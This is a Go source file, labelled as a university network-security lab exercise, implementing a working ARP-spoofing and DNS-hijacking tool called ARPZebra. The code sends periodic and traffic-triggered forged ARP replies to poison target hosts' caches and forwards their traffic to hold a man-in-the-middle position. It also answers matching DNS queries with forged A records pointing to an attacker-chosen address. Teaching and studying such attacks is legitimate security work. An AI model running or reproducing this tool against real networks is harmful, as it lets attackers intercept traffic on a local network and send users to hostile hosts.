/**
通达第三次网络安全实验
ARP欺骗
152201 第二组
*/

package arpzebra

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// 默认序列化配置参数
var defaultSerializeOpts = gopacket.SerializeOptions{
	FixLengths:       true,
	ComputeChecksums: true,
}

type uintIP uint32

func (i uintIP) ToIP() (ip net.IP) {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, uint32(i))
	return net.IP(b)
}

type ipMap struct {
	table map[uintIP]net.HardwareAddr
	sync.RWMutex
}

type Address struct {
	IP           net.IP
	HardwareAddr net.HardwareAddr
}

type DNSTarget struct {
	Matches []string `yaml:"matches"`
	Address string   `yaml:"address"`
}

type ARPZebra struct {
	/* 目标地址-MAC映射 */
	ipMap
	/* 当前网卡接口 */
	iface *net.Interface
	/* 当前网卡的地址 */
	selfip []net.Addr
	/* pcap句柄 */
	handler *pcap.Handle
	/* 本地网卡地址 */
	hostMac net.HardwareAddr
	/* 停止欺骗 */
	stop chan struct{}
	/* 主动攻击间隔 */
	waitInterval time.Duration
	//DNS目标
	DNSTargets []*DNSTarget `yaml:"targets"`
	/* 写锁 */
	writeLock sync.Mutex
	/* 网关的MAC地址 */
	GatewayMAC net.HardwareAddr
}

// 新建ARP欺骗器
func NewARPZebra(ifacename string, waitInterval time.Duration, stop chan struct{}) (*ARPZebra, error) {
	// 打开接口
	iface, err := net.InterfaceByName(ifacename)
	if err != nil {
		return nil, err
	}
	// 创建pcaphandler
	handler, err := pcap.OpenLive(iface.Name, 65535, true, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	// 获得本地网卡的ip地址
	addresses, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	return &ARPZebra{
		ipMap: ipMap{
			table: make(map[uintIP]net.HardwareAddr),
		},
		iface:        iface,              //网卡接口
		handler:      handler,            //pcap句柄
		hostMac:      iface.HardwareAddr, // 本机网卡MAC地址
		stop:         stop,               // 停止欺骗信号
		waitInterval: waitInterval,       // 主动攻击间隔
		selfip:       addresses,          // 本地接口的ip
	}, nil
}

// 将目标地址加入欺骗
func (t *ipMap) Add(ip net.IP, hwaddr net.HardwareAddr) {
	t.Lock()
	defer t.Unlock()
	t.table[uintIP(binary.BigEndian.Uint32(ip))] = hwaddr
}

// 将目标地址从欺骗列表中删除
func (t *ipMap) Delete(ip net.IP) {
	t.Lock()
	defer t.Unlock()
	delete(t.table, uintIP(binary.BigEndian.Uint32(ip)))
}

// 获取IP对应的MAC，如果不存在则返回nil
func (t *ipMap) Get(ip net.IP) net.HardwareAddr {
	t.Lock()
	defer t.Unlock()
	return t.table[uintIP(binary.BigEndian.Uint32(ip))]
}

// 关闭网口
func (self *ARPZebra) Close() {
	self.handler.Close()
}

// 监听所有数据包
func (self *ARPZebra) Run() {
	// 开启主动攻击
	go self.arpActive()
	// 分析数据包
	src := gopacket.NewPacketSource(self.handler, layers.LayerTypeEthernet)
	// 数据包channle
	in := src.Packets()
	for {
		var packet gopacket.Packet
		select {
		case <-self.stop:
			return
		case packet = <-in:
			// 打印数据包结构
			lastLayer := printPacketLevel(packet)

			// 根据包最高层的类型来进行分发处理
			switch lastLayer.(type) {
			case *layers.ARP:
				go self.parseARPPacket(packet)
			case *layers.DNS: // 接收DNS包
				go self.parseDNSPacket(packet)
			default:
				go self.packetForward(packet)
			}
		}
	}
}

// ip包转发
func (self *ARPZebra) packetForward(packet gopacket.Packet) {
	var ethPacket *layers.Ethernet
	if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer == nil {
		log.Print("无法读取Ethernet包!")
		return
	} else {
		// 类型断言，得到arp包结构
		ethPacket = ethLayer.(*layers.Ethernet)
	}

	// 判断当前包是否是给我的，如果是，则不转发
	// 目标mac是我，而且目标ip是要监听的
	if bytes.Compare(ethPacket.DstMAC, self.hostMac) != 0 {
		return
	}
	var ipv4Packet *layers.IPv4
	if ipv4Layer := packet.Layer(layers.LayerTypeIPv4); ipv4Layer == nil {
		log.Print("无法读取IPv4包，放弃转发")
		return
	} else {
		// 类型断言，得到arp包结构
		ipv4Packet = ipv4Layer.(*layers.IPv4)
	}

	// 找到目标ip的mac地址
	dstMacAddr := self.Get(ipv4Packet.DstIP)
	// 找到目标地址，发给其他地址或者网关地址
	if dstMacAddr == nil { // 如果找不到目标ip的地址，则丢弃
		dstMacAddr = self.GatewayMAC
	}

	buffer := gopacket.NewSerializeBuffer()
	ethPacket.SrcMAC = ethPacket.DstMAC
	ethPacket.DstMAC = dstMacAddr // 修改以太网层的目的mac地址
	layers := packet.Layers()
	gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, toSerializableLayer(layers)...)
	self.writeLock.Lock()
	defer self.writeLock.Unlock()
	if err := self.handler.WritePacketData(buffer.Bytes()); err != nil {
		log.Print("DNS原始数据包发送失败: ", err)
	}
}

// 检测可序列化的包并返回
func toSerializableLayer(ls []gopacket.Layer) []gopacket.SerializableLayer {
	outls := make([]gopacket.SerializableLayer, 0, len(ls))
	for _, l := range ls {
		outl, ok := l.(gopacket.SerializableLayer)
		if outl == nil || !ok {
			log.Printf("%s is not seriable\n", outl)
			continue
		}
		outls = append(outls, outl)
	}
	return outls
}

// 解析DNS包
func (self *ARPZebra) parseDNSPacket(packet gopacket.Packet) {
	// 如果DNS欺骗目标列表为空，则不处理DNS包

	if len(self.DNSTargets) == 0 {
		go self.packetForward(packet)
		return
	}

	ipL := packet.Layer(layers.LayerTypeIPv4)
	dnsL := packet.Layer(layers.LayerTypeDNS)

	if ipL == nil {
		return
	}

	dns := dnsL.(*layers.DNS)

	// 如果是本地发出的dns包，则略过
	ip := ipL.(*layers.IPv4)
	if ok := self.isSelfIP(ip.SrcIP); ok == true {
		return
	}

	// 判断是DNS请求还是应答
	if dns.QR {
		go self.packetForward(packet)
		return
	}

	// 读取请求包的请求地址
	for _, q := range dns.Questions {
		target, found := self.findTarget(string(q.Name))
		if !found {
			go self.packetForward(packet)
		} else {
			go self.hijackDNS(packet, target)
		}
		return
	}
	go self.packetForward(packet)
	return
}

// 生成DNS欺骗包
func (self *ARPZebra) hijackDNS(packet gopacket.Packet, target *DNSTarget) {
	srcEthernet := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	srcIP := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	srcUDP := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
	srcDNS := packet.Layer(layers.LayerTypeDNS).(*layers.DNS)

	question := srcDNS.Questions[0]

	ethernet := layers.Ethernet{
		SrcMAC:       srcEthernet.DstMAC,
		DstMAC:       srcEthernet.SrcMAC,
		EthernetType: srcEthernet.EthernetType,
	}

	ip := layers.IPv4{
		Version:  srcIP.Version,
		TTL:      srcIP.TTL,
		Protocol: srcIP.Protocol,
		SrcIP:    srcIP.DstIP,
		DstIP:    srcIP.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: srcUDP.DstPort,
		DstPort: srcUDP.SrcPort,
	}

	udp.SetNetworkLayerForChecksum(&ip)

	dns := layers.DNS{
		ID:           srcDNS.ID, // 标识
		QR:           true,      // 响应
		OpCode:       srcDNS.OpCode,
		AA:           true,                        //授权回答
		TC:           false,                       // 截断的
		RD:           srcDNS.RD,                   // 递归的
		RA:           srcDNS.RD,                   // 递归可用
		ResponseCode: layers.DNSResponseCodeNoErr, // 差错状态
		// TODO 问题部分在查询和响应报文中都要出现
		QDCount:   srcDNS.QDCount,   // 问题数
		Questions: srcDNS.Questions, // 问题
		ANCount:   1,
		Answers: []layers.DNSResourceRecord{
			layers.DNSResourceRecord{
				Name:  question.Name,   // 压缩（不压缩也可以）
				Type:  layers.DNSTypeA, // 只对A记录响应
				Class: question.Class,
				TTL:   60, // TTL为60秒
				IP:    net.ParseIP(target.Address),
			},
		},
	}

	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, defaultSerializeOpts, &ethernet, &ip, &udp, &dns); err != nil {
		log.Println("构造DNS包错误：", err)
	}
	self.writeLock.Lock()
	defer self.writeLock.Unlock()
	if err := self.handler.WritePacketData(buf.Bytes()); err != nil {
		log.Print("DNS原始数据包发送失败: ", err)
	}

	fmt.Printf("\x1B[35m欺骗\x1B[0m %s 到 %s\n", string(question.Name), target.Address)
}

func (self *ARPZebra) findTarget(name string) (*DNSTarget, bool) {
	for _, target := range self.DNSTargets {
		for _, match := range target.Matches {
			if found, _ := regexp.MatchString(match, name); found {
				return target, true
			}
		}
	}
	return nil, false
}

// 解析arp包
func (self *ARPZebra) parseARPPacket(packet gopacket.Packet) {
	var arpPacket *layers.ARP
	if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer == nil {
		log.Print("无法读取ARP包!")
		return
	} else {
		// 类型断言，得到arp包结构
		arpPacket = arpLayer.(*layers.ARP)
	}

	// 判断当前ARP包是否是感兴趣包：源ip和请求ip都在目标ip内
	if self.Get(arpPacket.SourceProtAddress) == nil || self.Get(arpPacket.DstProtAddress) == nil {
		// 都不是
		return
	}
	log.Printf("\x1B[32m接收到ARP\x1B[0m (%d): %v (%v) -> %v (%v)",
		arpPacket.Operation,
		net.IP(arpPacket.SourceProtAddress),
		net.HardwareAddr(arpPacket.SourceHwAddress),
		net.IP(arpPacket.DstProtAddress),
		net.HardwareAddr(arpPacket.DstHwAddress))

	go self.arpPassive(packet) // 被动攻击
}

// 被动ARP攻击
/*
被动攻击：在同一冲突域下面的主机，接收到ARP相应包之后就主动回应伪造ARP攻击包
当收到target之间的ARP请求包的时候，会紧接着构造一个特殊伪装的请求包再去请求目标主机：
比如：两个主机AB，A和B是正常主机，C是攻击者
A向B发送一个ARP请求包：
以太网帧：源MAC地址：A的MAC地址，目的地址：广播
ARP请求帧：源mac地址：A的MAC地址，源协议地址：A的IP地址，目的MAC地址：0，目的协议地址：目的IP地址
伪造的ARP请求包：
以太网帧：源mac地址：C的mac地址，目的MAC地址：目的MAC地址（单播形式）
ARP请求帧：源mac地址：C的mac地址。源协议地址：A的IP地址，目的MAC地址：0，目的协议地址：目的IP地址
当收到target之间的arp应答包的时候，再跟一个伪造的arp应答包
*/
func (self *ARPZebra) arpPassive(packet gopacket.Packet) {
	// 分离出ARP包
	var arpPacket *layers.ARP // arp包
	if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer == nil {
		log.Print("无法获得ARP包!")
		return
	} else {
		// 类型断言，得到arp包结构
		arpPacket = arpLayer.(*layers.ARP)
	}
	var src, dst *Address
	if arpPacket.Operation == layers.ARPRequest {
		// arp包目的
		dst = &Address{
			IP:           arpPacket.SourceProtAddress,
			HardwareAddr: arpPacket.SourceHwAddress,
		}
		src = &Address{
			IP:           arpPacket.DstProtAddress,
			HardwareAddr: self.hostMac,
		}
	} else { // 应答包
		dst = &Address{
			IP:           arpPacket.DstProtAddress,
			HardwareAddr: arpPacket.DstHwAddress,
		}
		src = &Address{
			IP:           arpPacket.SourceProtAddress,
			HardwareAddr: self.hostMac,
		}
	}
	// 发送ARP包
	buf, err := NewARPReply(src, dst)
	if err != nil {
		log.Print("新建ARP包错误:", err)
		return
	}
	self.writeLock.Lock()
	defer self.writeLock.Unlock()
	if err := self.handler.WritePacketData(buf); err != nil {
		log.Print("ARP原始数据包发送失败: ", err)
	}

}

// 主动ARP攻击
/*
在不同冲突域下面的主机要用主动攻击，被动攻击无效
*/
func (self *ARPZebra) arpActive() {
	t := time.NewTicker(self.waitInterval)
	for {
		select {
		case <-self.stop:
			log.Print("主动攻击线程停止")
			return
		default:
			<-t.C
			for ip, mac := range self.ipMap.table {
				for ip2, mac2 := range self.ipMap.table { // 目标地址
					if ip == ip2 {
						continue // 跳过相同的ip
					}
					// arp包目的
					dst := &Address{
						IP:           ip.ToIP(),
						HardwareAddr: mac,
					}
					src := &Address{
						IP:           ip2.ToIP(),
						HardwareAddr: self.hostMac,
					}

					log.Printf("\x1B[34mTell\x1B[0m %s [%s]: %s's MAC is %s, but it is actually %s.",
						ip.ToIP(), mac, ip2.ToIP(), self.hostMac, mac2)

					buf, err := NewARPReply(src, dst)
					if err != nil {
						log.Print("新建ARP包错误:", err)
						continue
					}
					self.writeLock.Lock()
					if err := self.handler.WritePacketData(buf); err != nil {
						log.Print("ARP原始数据包发送失败: ", err)
					}
					self.writeLock.Unlock()
				}
			}
		}
	}
}

// 构造ARPPacket
func buildPacket(src *Address, dst *Address, op uint16) ([]byte, error) {
	// 构造以太网包
	ether := &layers.Ethernet{
		EthernetType: layers.EthernetTypeARP,

		SrcMAC: src.HardwareAddr,
		DstMAC: dst.HardwareAddr,
	}
	// 构造ARP包
	arp := &layers.ARP{
		AddrType: layers.LinkTypeEthernet,
		Protocol: layers.EthernetTypeIPv4,

		HwAddressSize:   6,
		ProtAddressSize: 4,

		Operation: op,

		SourceHwAddress:   []byte(src.HardwareAddr),
		SourceProtAddress: []byte(src.IP.To4()),

		DstHwAddress:   []byte(dst.HardwareAddr),
		DstProtAddress: []byte(dst.IP.To4()),
	}
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, defaultSerializeOpts, ether, arp); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// 新建ARP请求包
func NewARPRequest(src *Address, dst *Address) ([]byte, error) {
	return buildPacket(src, dst, layers.ARPRequest)
}

// 新建ARP应答包
func NewARPReply(src *Address, dst *Address) ([]byte, error) {
	return buildPacket(src, dst, layers.ARPReply)
}

// 打印数据包层次结构 Ethernet -> ARP 以及信息
// 返回除payload外最高的一个layer
func printPacketLevel(p gopacket.Packet) (lastLayer gopacket.Layer) {
	var levelStr string = "| "
	// 获得以太网数据包
	ethLayer := p.Layer(layers.LayerTypeEthernet)
	if ethLayer == nil {
		return nil
	}
	ethPacket := ethLayer.(*layers.Ethernet)
	// 该以太网包流向
	levelStr += ethPacket.SrcMAC.String() + " => " + ethPacket.DstMAC.String() + " :: "

	// 获取该数据包的所有层次
	layers := p.Layers()
	for _, v := range layers {
		// 找到最后一个不是payload的层
		if v.LayerType() != gopacket.LayerTypePayload {
			lastLayer = v
		}
		levelStr += v.LayerType().String() + " -> "
	}
	// 显示包信息，对内容我并不感兴趣
	log.Print(strings.TrimRight(levelStr, " -> "))
	return
}

// 判断ip是否时本机网卡的
func (self *ARPZebra) isSelfIP(ip net.IP) bool {
	for _, addr := range self.selfip {
		ipAddr, ok := addr.(*net.IPNet)
		if !ok {
			continue
		}
		if ipAddr.IP.Equal(ip) {
			return true
		}
	}
	return false
}
